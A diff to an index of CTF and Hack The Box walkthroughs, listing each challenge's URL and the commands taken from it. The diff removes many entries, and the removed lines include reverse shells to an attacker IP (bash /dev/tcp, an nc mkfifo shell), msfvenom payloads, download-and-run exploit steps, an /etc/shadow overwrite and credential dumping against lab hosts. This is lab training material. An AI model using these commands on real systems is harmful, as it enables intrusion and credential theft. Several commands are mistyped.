@@ -1,4 +1,4 @@
-Total Challenges: 257
+Total Challenges: 140
 
 
 Challenge Name: the-planets-earth-ctf-walkthrough-part-1
@@ -1255,13 +1255,6 @@ nmap 192.168.1.14 -sV -p-
 
 
 
-Challenge Name: hack-the-box-htb-walkthrough-teacher
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-teacher/
-
-nmap -sC -sV -oA Teacher 10.10.10.153
-
-
-
 Challenge Name: hack-the-box-htb-walkthrough-ctf-omni
 Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-ctf-omni/
 
@@ -1297,44 +1290,8 @@ echo “192.168.1.22 datasafe.votenow.local”
 
 
 
-Challenge Name: hack-the-box-htb-walkthrough-unbalanced
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-unbalanced/
-
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-openkeys
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-openkeys/
-
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-buff
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-buff/
-
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-vault
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-vault/
-
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-fuse
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-fuse/
-
-
-
-
 Challenge Name: capture-the-flag-a-walkthrough-of-suncsrs-katana
 Challenge URL: https://resources.infosecinstitute.com/topic/capture-the-flag-a-walkthrough-of-suncsrs-katana/
-
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-node
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-node/
 
 
 
@@ -1354,24 +1311,6 @@ cat user.txt
 
 Challenge Name: lazyadmin-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/lazyadmin-ctf-walkthrough/
-
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-admirer
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-admirer/
-
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-blunder
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-blunder/
-
-
-
-
-Challenge Name: hack-the-box-htb-machines-walkthrough-series-cache
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-machines-walkthrough-series-cache/
 
 
 
@@ -1412,27 +1351,6 @@ Challenge URL: https://resources.infosecinstitute.com/topic/djinn-1-vulnhub-ctf-
 
 
 
-Challenge Name: hack-the-box-htb-walkthrough-magic
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-magic/
-
-nmap -sC -sV -oA Magic 10.10.10.185
-
-
-
-Challenge Name: hack-the-box-htb-machines-walkthrough-series-remote
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-machines-walkthrough-series-remote/
-
-nmap -sC -sV -oA Remote 10.10.10.180
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-ai
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-ai/
-
-nmap -sC -sV -T4 10.10.10.163
-
-
-
 Challenge Name: typo-1-vulnhub-ctf-walkthrough-part-2
 Challenge URL: https://resources.infosecinstitute.com/topic/typo-1-vulnhub-ctf-walkthrough-part-2/
 
@@ -1457,33 +1375,8 @@ Challenge URL: https://resources.infosecinstitute.com/topic/pwned-1-vulnhub-ctf-
 
 
 
-Challenge Name: hack-the-box-htb-walkthrough-cascade-part-2
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-cascade-part-2/
-
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-cascade-part-1
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-cascade-part-1/
-
-
-
-
 Challenge Name: zion-1-2-vulnhub-ctf-walkthrough-part-1
 Challenge URL: https://resources.infosecinstitute.com/topic/zion-1-2-vulnhub-ctf-walkthrough-part-1/
-
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-traceback
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-traceback/
-
-nmap -sC -sV -oA Traceback 10.10.10.181
-
-
-
-Challenge Name: capture-the-flag-ctf-suncsrs-geisha
-Challenge URL: https://resources.infosecinstitute.com/topic/capture-the-flag-ctf-suncsrs-geisha/
 
 
 
@@ -1491,20 +1384,6 @@ Challenge URL: https://resources.infosecinstitute.com/topic/capture-the-flag-ctf
 Challenge Name: sunset-decoy-vulnhub-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/sunset-decoy-vulnhub-ctf-walkthrough/
 
-
-
-
-Challenge Name: hack-the-box-htb-machines-walkthrough-series-resolute
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-machines-walkthrough-series-resolute/
-
-nmap -sC -sV -p- -oA Resolute 10.10.10.169
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-monteverde
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-monteverde/
-
-nmap -sC -sV -p- -oA Monteverde 10.10.10.172
 
 
 
@@ -1520,13 +1399,6 @@ Challenge URL: https://resources.infosecinstitute.com/topic/mumbai-vulnhub-ctf-w
 
 
 
-Challenge Name: hack-the-box-htb-machines-walkthrough-series-sauna
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-machines-walkthrough-series-sauna/
-
-nmap -sC -sV -oA Sauna 10.10.10.175
-
-
-
 Challenge Name: my-tomcat-host-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/my-tomcat-host-ctf-walkthrough/
 
@@ -1539,35 +1411,9 @@ Challenge URL: https://resources.infosecinstitute.com/topic/bossplayersctf-1-vul
 
 
 
-Challenge Name: hack-the-box-htb-walkthrough-servmon
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-servmon/
-
-nmap -sC -sV -oA ServMon 10.10.10.184
-
-
-
 Challenge Name: capture-the-flag-a-walkthrough-of-suncsrs-sumo
 Challenge URL: https://resources.infosecinstitute.com/topic/capture-the-flag-a-walkthrough-of-suncsrs-sumo/
 
-
-
-
-Challenge Name: lab-hacking-an-android-device-with-msfvenom
-Challenge URL: https://resources.infosecinstitute.com/topic/lab-hacking-an-android-device-with-msfvenom/
-
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-nest-pt-2
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-nest-pt-2/
-
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-nest-pt-1
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-nest-pt-1/
-
-nmap -sC -sV -oA Nest 10.10.10.178
 
 
 
@@ -1595,26 +1441,8 @@ Challenge URL: https://resources.infosecinstitute.com/topic/djinn-1-ctf-walkthro
 
 
 
-Challenge Name: active-directory-series-unconstrained-delegation
-Challenge URL: https://resources.infosecinstitute.com/topic/active-directory-series-unconstrained-delegation/
-
-
-
-
-Challenge Name: active-directory-series-silver-ticket
-Challenge URL: https://resources.infosecinstitute.com/topic/active-directory-series-silver-ticket/
-
-
-
-
 Challenge Name: aqua-1-vulnhub-capture-the-flag-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/aqua-1-vulnhub-capture-the-flag-ctf-walkthrough/
-
-
-
-
-Challenge Name: active-directory-walkthrough-series-golden-ticket
-Challenge URL: https://resources.infosecinstitute.com/topic/active-directory-walkthrough-series-golden-ticket/
 
 
 
@@ -1659,36 +1487,6 @@ Challenge Name: ck-00-ctf-walkthrough-part-1
 Challenge URL: https://resources.infosecinstitute.com/topic/ck-00-ctf-walkthrough-part-1/
 
 gcc
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-traverxec
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-traverxec/
-
-nmap -sC -sV -oA Traverxec 10.10.10.165
-tar zxvf daidfile.tgz
-python /usr/share/john/ssh2john.py id_rsa > david.hash
-john david.hash –wordlist=rockyou.txt
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-mango
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-mango/
-
-nmap -sC -sV -oA Mango 10.10.10.162
-python mangoenum.py -u http://<> -up username — password -op login:login -ep username
-python mangoenum.py -u http://<> -up username — password -op login:login -ep password
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-registry
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-registry/
-
-nmap -sC -sV -oA Registry 10.10.10.159
-restic init –repo lhm
-ssh -i id_rsa bolt@10.10.10.159 -R 8000:127.0.0.1:8000
-.rest-server –path <repo> –no-auth
-restic -r lhm restore aa3069fe –target
 
 
 
@@ -1745,20 +1543,6 @@ cat proof.txt
 
 
 
-Challenge Name: hack-the-box-htb-walkthrough-forest
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-forest/
-
-nmap -sC -sV -oA Forest 10.10.10.161
-GetNPUsers htb.lcoal/ -dc-ip 10.10.10.161 -no-pass
-hashcat -m 18200 -force
-evil-winrm -u svc-alfresco -p -i 10.10.10.161
-Get-NetUser -Username svc-alfresco
-Get-NetGroup -username avc-alfresco
-Invoke-BloodHound -CollectionMethod All
-./secretsdump.py htb/svc-alfresco:s3rvice@10.10.10.161
-
-
-
 Challenge Name: ctf-walkthrough-vulnhub-five86
 Challenge URL: https://resources.infosecinstitute.com/topic/ctf-walkthrough-vulnhub-five86/
 
@@ -1775,682 +1559,11 @@ sudo -l
 
 
 
-Challenge Name: hack-the-box-htb-walkthrough-postman
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-postman/
-
-nmap -sC -sV -oA Postman 10.10.10.160
-nmap -sC -p- -oA postman.full 10.10.10.160
-nmap –script redis-info -sV -p 6379 10.10.10.160
-redis-cli -h 10.10.10.160
-CONFIG GET authorized-keys
-CONFIG GET dir
-keys *
-msfvenom -p cmd/unix/reverse_perl LHOST=<LHOST> LPORT=4422 -f raw > rshell.pl
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-json
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-json/
-
-nmap -sC -sV -oA Json 10.10.10.158
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-joker
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-joker/
-
-nmap -sC -sV -oA Joker 10.10.10.21
-nmap -sU -T4 10.10.10.21
-tftp 10.10.10.21
-get /etc/squid/passwords
-john –wordlist=/usr/share/wordlists/rockyou.txt passwords
-sudo -l
-ln -s /home/alekos/.ssh.authorized_keys layout.html
-ssh-keygen
-sudoedit -u alekos /var/www/testing/lhm/layout.html
-cat user.txt
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-chatterbox
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-chatterbox/
-
-nmap -sC -sV -oA Chatterbox 10.10.10.74
-nmap -sT -p- -min-rate 4000 –max-retries 1 10.10.10.74
-nmap -sV -sC -p 9255 10.10.10.74
-icacls root.txt
-dir /q /a:
-icacls root.txt /grant Alfred:(F)
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-sneaky
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-sneaky/
-
-nmap -sC -sV -oA Sneaky 10.10.10.20
-find / -perm 4000 2>/dev/null
-pattern_create.rb -l 400
-pattern_offset.rb -q {location}
-chal ${python exp.py}
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-gitlab
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-gitlab/
-
-nmap‌ ‌-sC‌ ‌-sV‌ ‌-oA‌ ‌Gitlab‌ ‌10.10.10.114
-cd /tmp
-cd lhm
-cp -rf /var/www/html/profile .
-echo ‘reverse shell’ > .git/hooks/post-merge
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-aragog
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-aragog/
-
-nmap -sC -sV -oA Aragog 10.10.10.78
-ftp 10.10.10.78
-ls
-get test.txt
-
-
-
-Challenge Name: hack-the-box-htb-machines-walkthrough-series-heist
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-machines-walkthrough-series-heist/
-
-nmap‌ ‌-sC‌ ‌-sV‌ ‌-oA‌ ‌Heist‌ ‌10.10.10.149
-lookupsid.py hazard:<pwd>@10.10.10.149
-evil-winrm -i 10.10.10.149 -u chase -p <pwd
-upload {prodump64}
-./procdump64.exe –accepteula
-./procdump64.exe -ma {pid}
-upload {strings64}
-cmd /c “strings64.exe –accepteula f.dmp > d.txt”
-findstr “password” d.txt
-
-
-
-Challenge Name: hack-the-box-htb-machines-walkthrough-series-networked
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-machines-walkthrough-series-networked/
-
-nmap -sC -sV -oA Networked 10.10.10.146
-cd guly
-cat user.txt
-pwd
-touch ‘;<ip> 8844 -c bash’
-python -c “import pty;pty.spawn(‘/bin/bash’)”
-cat user.txt
-
-
-
-Challenge Name: hack-the-box-htb-machines-walkthrough-series-wall
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-machines-walkthrough-series-wall/
-
-nmap -sC -sV -oA Wall 10.10.10.157
-bash exploit.sh
-
-
-
-Challenge Name: hack-the-box-htb-machines-walkthrough-series-arctic
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-machines-walkthrough-series-arctic/
-
-nmap -sC -sV -oA Arctic 10.10.10.11
-nc -nlvp 4422
-python windows-exloit-suggester.py –update
-python windows-exloit-suggester.py –datebase <dbfile> –systeminfo <sysfile
-exp.exe <attacking machine> 8844
-cd C:UsersAdministratorDesktop
-type root.txt
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-jarvis
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-jarvis/
-
-nmap -sC -sV -oA Jarvis10.10.10.143
-sudo -l
-sudo -u pepper /var/www/Admin-Utilities/simpler.py
-sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
-$(/bin/bash)
-bash -i >& /dev/tcp/<ip>/4422 0>&1
-find / -perm -u=s -type f 2>/dev/null
-wget http://10.10.14.55/lhmhtb.service
-/bin/systemctl enable /home/pepper/lhmhtb.service
-nc -nlvp 4444
-cat root.txt
-
-
-
-Challenge Name: hack-the-box-htb-machines-walkthrough-series-haystack
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-machines-walkthrough-series-haystack/
-
-nmap -sC -sV -oA Haystack 10.10.10.115
-string needle.jpg
-ssh security@10.10.10.115
-cat user.txt
-cd /etc/logstash
-ls -l
-ss -lnt
-ssh -L 5601:127.0.0.1:5601 security@10.10.10.115
-python -c “import pty;pty.spawn(‘/bin/bash’)”
-echo ‘Ejecutar comando: bash -i >& /dev/tcp/10.10.14.2/4422 0>&1’ > /opt/kibana/logstash_shell.txt
-nc -nlvp 4422
-cat root.txt
-
-
-
-Challenge Name: hack-the-box-htb-machines-walkthrough-series-nibbles
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-machines-walkthrough-series-nibbles/
-
-nmap -sC -sV -oA nibbles 10.10.10.75
-echo “rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacking machine>  4422 > /tmp/f”
-
-
-
-Challenge Name: hack-the-box-htb-machines-walkthrough-series-swagshop
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-machines-walkthrough-series-swagshop/
-
-nmap -sC -sV -oA Swagshop 10.10.10.140
-python -m SimpleHTTPServer 80
-nc -nlvp 4321
-pwd
-cat user.txt
-sudo -l
-sudo vi /var/www/html/escape.sh
-:!/bin/sh
-cd /root
-cat root.txt
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-popcorn
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-popcorn/
-
-nmap -sC -sV -oA Popcorn 10.10.10.6
-nc -nlvp 1234
-cat user.txt
-wget http://10.10.14.11/14339.sh
-bash 14339.sh
-uname -a
-wget http://10.10.14.11/15704.c
-gcc 15704.c -o exp
-./exp
-
-
-
-Challenge Name: hack-the-box-htb-machines-walkthrough-series-celestial
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-machines-walkthrough-series-celestial/
-
-nmap -sC -sV -oA Celestial 10.10.10.85
-cat user.txt
-cat /var/log/syslog
-mv script.py ~
-wget http://<attacking machine IP>/script.py .
-nc -nlvp 4422
-cat root.txt
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-bastion
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-bastion/
-
-nmap -sC -sV -oA Bastion 10.10.10.134
-smbclient -I 10.10.10.134 -L Bastion
-smbclient //10.10.10.134/Backups
-mount -t cifs //10.10.10.134/Backups/ /opt/HTB/bastion/vhd -o ro
-guestmount –add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd –inspector –ro /opt/HTB/bastion/windowsvhd/ -v
-pwdump SYSTEM SAM
-dir /s /b confCons.xml
-ssh Administrator@10.10.10.134
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-secnotes
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-secnotes/
-
-nmap -sC -sV -oA SecNotes 10.10.10.97
-smbclient 10.10.10.97new-site -U tyler
-msfvenom -p php/reverse_php LHOST=<> LPORT=4488 -o shell.php
-nc -nlvp 4488
-type user.txt
-dir bash.exe /b/s
-bash.exe  -i
-cat .bash_history
-smbclient -U ‘administrator’ 10.10.10.97c$
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-luke
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-luke/
-
-nmap -sC -sV -oA Luke 10.10.10.137
-ftp 10.10.10.137
-cd webapp
-get for_Chihiro.txt
-dirb http://10.10.10.137
-dirb http://10.10.10.137:3000
-pwd
-cat user.txt
-cat root.txt
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-friendzone
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-friendzone/
-
-nmap -sC -sV -oA FriendZone 10.10.10.123
-nmap –script=smb-enum-shares.nse -p445 10.10.10.123
-smbclient //10.10.10.123/general -U “”
-get creds.txt
-cat creds.txt
-dig axfr friendzone.red @10.10.10.123
-dig axfr friendzoneportal.red @10.10.10.123
-smbclient //10.10.10.123/development -U “”
-put reverse.php
-nc -nlvp 4488
-cd home
-cd friend
-ls
-cat user.txt
-cd /var/www
-cat mysql_data.conf
-ssh friend@10.10.10.123
-scp pspy64 friend@10.10.10.123:/home/friend
-cd /opt/server_admin/
-ls -la
-cat reporter.py
-nc -nlvp 8844
-id
-cd /root
-cat root.txt
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-shocker
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-shocker/
-
-nmap -sC -sV -oA Shocker 10.10.10.56
-dirb http://10.10.10.56
-curl -vvv http://10.10.10.56/cgi-bin/user.sh
-ls
-cat user.txt
-sudo -l
-sudo perl -e ‘exec’ “/bin/sh”
-id
-cat /root/root.txt
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-waldo
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-waldo/
-
-nmap -sC -sV -oA Waldo 10.10.10.87
-ssh -i <keyname> nobody@10.10.10.87
-cat user.txt
-netstat -anlp
-ssh -i .monitor monitor@localhost
-ssh -i .monitor monitor@localhost -t “bash –noprofile”
-ls
-cd app-dev
-ls -l
-echo $PATH
-export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin
-./logMonitor -a
-./logMonitor -b
-./logMonitor-0.1 -a
-getcap logMonitor-0.1 2>/dev/null
-getcap -r / 2>/dev/null
-tac /root/root.txt
-
-
-
-Challenge Name: capture-the-flag-ctf-minu1
-Challenge URL: https://resources.infosecinstitute.com/topic/capture-the-flag-ctf-minu1/
-
-nmap –A 192.168.11.12
-msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.11.14 lport=4444 -f elf > /var/www/html/shell
-./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.pn55j1CFpcLjvReaqyJr0BPEMYUsBdoDxEPo6Ft9cwg
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-netmon
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-netmon/
-
-nmap -sC -sV -oA Netmon 10.10.10.152
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-access
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-access/
-
-nmap -sC -sV -oA Access 10.10.10.98
-ftp 10.10.10.98
-anonymous
-mget backup.md
-mget Access Control.zip
-strings backup.md
-readpst Access Control.pst
-cat Access Control
-telnet -l security 10.10.10.98
-cd C:UserssecurityDesktop
-type user.txt
-type <name>.lnkl
-cmdkey /list
-runas /user:AccessAdministrator /savecred “cmd /c type C:UsersAdministratorDesktoproot.txt > C:UserssecurityDesktopflag.txt”
-cd C:UserssecurityDesktop
-type flag.txt
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-blocky
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-blocky/
-
-nmap -sC -sV -oA Blocky 10.10.10.37
-unzip BlockyCore.jar
-jad BlockyCore.class
-cat BlockCore.jad
-ssh notch@10.10.10.37
-cat user.txt
-sudo -l
-sudo su
-cd /root
-cat root.txt
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-help
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-help/
-
-nmap -sC -sV -oA Help 10.10.10.121
-date
-cat user.txt
-cat /etc/lsb-release
-uname -a
-wget http://<attacking machine:8000/exploit.c
-gcc exploit.c -o rootexp
-./rootexp
-cat root.txt
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-lightweight
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-lightweight/
-
-nmap -sC -sV -oA Lightweight 10.10.10.119
-nmap –script=ldap-search 10.10.10.119
-getcap -r /usr/bin
-getcap -r /usr/sbin
-tcpdump -i any -w ~/lightweight.pcap
-su ldapuser2
-cat user.txt
-base64 -d bk.64 > backup.7z
-python 7z-Bruteforce/main.py -f backup.7z -w /usr/share/wordlists/rockyou.txt
-7z e backup.7z
-cay status.php
-su ldapuser1
-getcap -r
-/home/ldapuser1/openssl base64 -in /root.root.txt | base64 -d
-/home/ldapuser1/openssl base64 -in /etc/shadow -out shadow |  base64 -d
-/home/ldapuser1/openssl passwd -1 -salt htb htb
-/home/ldapuser1/openssl enc -in shadownew -out /etc/shadow
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-ypuffy
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-ypuffy/
-
-nmap -sC -sV -oA YPuffy 10.10.10.107
-ldapsearch -h 10.10.10.107 -x -b “dc=hackthebox,dc=htb”
-smbclient -I 10.10.10.107 -U alice1978 –pw-nt-hash //10.10.10.107/alice
-mget my_private_key.ppk
-puttygen my_private_key.ppl -O private-openssh -o key
-puttygen my_private_key.ppl -O public-openssh -o key.pub
-ssh -i key alice1978@10.10.10.107
-uname -a
-cat /etc/ssh/ssh_config
-curl http://127.0.0.1/sshauth>type=principals&username=root
-ssh-keygen
-doas -u userca /usr/bin/ssh-keygen -s ca -I root -n <dovered above> /tmp/recon.pub
-ssh -i /tmp/recon root@localhost
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-hawk
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-hawk/
-
-nmap -sC -sV -oA Hawk 10.10.10.102
-nmap -sC -sV -p 8082 10.10.10.102
-ftp 10.10.10.102
-ls -la
-get .drupal.txt.enc
-file .drupal.txt.enc
-go build -o openssl-brute
-./openssl-brute -file ../.drupal.txt.enc
-nc -nlvp 1234
-cd /home
-cd daniel
-cat user.txt
-cd /tmp
-python3 exploit.py
-cat root.txt
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-irked
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-irked/
-
-nmap -sC -sV -oA irked 10.10.10.117
-steghide info irked.jpg
-msfvenom -p cmd/unix/reverse_perl LHOST=<attacking machine ip> LPORT=1234 -f raw
-python -c ‘import pty;pty.spawn(“/bin.bash”)’
-ls -la
-steghide extract -sf irked.jpg
-cat pass.txt
-ssh djmardov@10.10.10.17
-cd Documents
-cat user.txt
-find / -perm -u=s -type f 2>/dev/null
-ls -l /usr/bin/viewuser
-/sus/bin/viewuser
-echo ‘/bin/sh’ > /tmp/listusers
-cd /root
-cat root.txt
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-devoops
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-devoops/
-
-nmap -sC -sV -oA DevOops 10.10.10.91
-gobuster -u http://10.10.10.91:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
-git log -p
-ssh -i <saved key> root@10.10.0.91
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-apocalyst
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-apocalyst/
-
-nmap -sC -sV -oA Apocalyst 10.10.10.46
-cewl 10.10.10.46 > list.txt
-steghide info htb2.jpg
-steghide extract -sf htb2.jpg
-wpscan -u http://10.10.10.46 –username falaraki –wordlist /opt/HTB/apocalyst/list.txt
-echo <content> | base64 -d
-ssh falaraki@10.10.10.46
-openssl passwd -1
-su – lhm
-cat root.txt
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-poison
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-poison/
-
-nmap -sC -sV -oA Poison 10.10.10.84
-10.10.10.84/browse.php?file=listfiles.php
-ssh charix@10.10.10.84
-cat user.txt
-scp charix@10.10.10.84:~/secret.zip
-ps -aux
-netstat -an
-ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84
-vncviewer 127.0.0.1:5901 -passwd secret
-ls
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-canape
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-canape/
-
-nmap -sC -sV -oA Canape 10.10.10.70
-http://10.10.10.70/.git/config
-10.10.10.70 git.canape.htb
-http://10.10.10.70/submit
-python exploit.py
-nc -nlvp 4000
-netstat -anlp
-nmap -sC -sV -p65535 10.10.10.70
-curl http://127.0.0.1:5984/_all_dbs
-curl -X PUT ‘http://localhost:5984/_users/org.couchdb.user:lhm’ –data-binary ‘{ “type”: “user”, “name”: “lhm”, “roles”: [“_admin”], “roles”: [], “password”: “lhm” }’
-curl http://127.0.0.1:5984/passwords/_all_docs?include_docs=true -u lhm:lhm
-ssh homer@10.10.10.70 -p 65535
-cat user.txt
-sudo -l
-sudo pip install .
-mv test.py setup.py
-sudo pip install .
-nc -nlvp 4444
-cd /root
-cat root.txt
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-bashed
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-bashed/
-
-nmap -sC -sV -oA Bashed 10.10.10.68
-gobuster -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
-cd /home
-ls
-cd arrexel
-ls
-cat user.txt
-python -m SImpleHTTPServer
-wget http://10.10.10.14.9:8000/shell.php
-cd /var/www/html/uploads
-wget http://10.10.10.14.9:8000/shell.php
-nc -nlvp 1234
-cd /home
-ls
-cd arrexel
-ls
-cat user.txt
-python -c “import pty;pty.spawn(‘/bin/bash’);”
-sudo -l
-sudo -u scriptmanager /bin/bash
-ls -l
-cat test.py
-cat test.py
-ip=10.10.14.9
-port=4422
-wget http://10.10.10.14.9:8000/test.py
-nc -nlvp 4422
-id
-
-
-
-Challenge Name: hack-the-box-htb-walkthrough-series-curling
-Challenge URL: https://resources.infosecinstitute.com/topic/hack-the-box-htb-walkthrough-series-curling/
-
-nmap -sC -sV -oA Curling 10.10.10.150
-http://10.10.10.150/administrator
-echo <secret> | base64 -d
-nc -nlvp 1234
-/templates/beez3/shell.php
-cd /home
-cd floris
-ls -la
-cat password_backup
-file pwd
-xxd -r pwd >pwd1
-file pwd1
-mv pwd1 pwd1.bz
-bzip2 -d pwd1.bz
-file pwd1
-mv pwd1 pwd1.gz
-gzip -d pwd1.gz
-file pwd1
-mv pwd1 pwd1.bz
-bzip2 -d pwd1.bz
-file pwd1
-mv pwd1 pwd1.tar
-tar -xvf pwd1.tar
-cat password.txt
-ssh floris@10.10.10.150
-cat user.txt
-cd admin-area
-cat input
-url =”file:///root/root.txt”
-python -m SimpleHTTPServer
-url=”http://<attacking ip>:8000/sudoers”
-sudo su
-
-
-
 Challenge Name: matrix-1-ctf-walkthrough
 Challenge URL: https://resources.infosecinstitute.com/topic/matrix-1-ctf-walkthrough/
 
 netdiscover
